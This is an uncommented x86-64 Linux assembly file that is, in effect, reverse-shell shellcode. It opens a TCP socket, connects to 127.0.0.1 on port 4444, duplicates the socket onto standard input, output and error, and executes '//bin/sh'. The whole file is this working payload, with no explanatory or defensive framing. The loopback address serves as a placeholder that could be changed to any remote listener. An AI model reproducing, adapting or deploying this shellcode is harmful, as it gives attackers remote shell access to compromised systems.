BITS 64

section .text
global _start

_start:
    xor rax, rax
    mov al, 41
    xor rdi, rdi
    mov dil, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    syscall
    test rax, rax
    js exit
    mov rbx, rax

    mov r12, rsp
    sub rsp, 16
    mov rsi, rsp
    mov word [rsi], 2
    mov word [rsi + 2], 0x5c11
    mov dword [rsi + 4], 0x0100007f

    mov rax, 42
    mov rdi, rbx
    mov dl, 16
    syscall
    test rax, rax
    js exit
    mov rsp, r12

    xor rsi, rsi
dup_loop:
    mov rax, 33
    mov rdi, rbx
    syscall
    test rax, rax
    js exit
    inc rsi
    cmp rsi, 3
    jl dup_loop

    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
    test rax, rax
    js exit

exit:
    mov rax, 60
    xor rdi, rdi
    syscall
